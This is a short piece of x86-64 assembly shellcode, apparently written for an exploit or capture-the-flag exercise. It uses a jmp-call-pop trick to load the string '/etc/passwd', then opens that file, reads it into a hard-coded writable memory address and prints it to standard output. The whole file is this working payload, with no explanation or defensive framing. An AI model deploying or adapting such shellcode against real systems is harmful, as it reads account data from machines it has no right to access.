[section .text]

global _start

_start:
	jmp ender
	
starter:
	;fd = open('/etc/passwd',O_RDONLY /* = 0 */,0)
	pop rdi						;rdi = '/etc/passwd'
	mov rsi, 0x0 
	mov rdx, 0x0
	mov rax, 2 					;sys_open = 2
	syscall
	
	; save fd to rbx
	mov rbx, rax
	
	;read(fd, memory_w, size)
	mov rdi, rbx 				;fd
	mov rsi, 0x0000000000614480 ;writable memory
	mov rdx, 0x100000
	mov rax, 0					;sys_read = 0
	syscall
	
	;write(stdout, memory_w, size)
	mov rdi, 1					;stdout = 1
	mov rsi, 0x0000000000614480 ;writable memory
	mov rdx, rax				;rax = bytes readed by read()
	mov rax, 1					;sys_write = 1
	syscall
	
	;exit(0)
	mov rdi, 0
	mov rax, 60					;sys_exit = 60
	syscall
	
ender:
	call starter
	db '/etc/passwd', 0
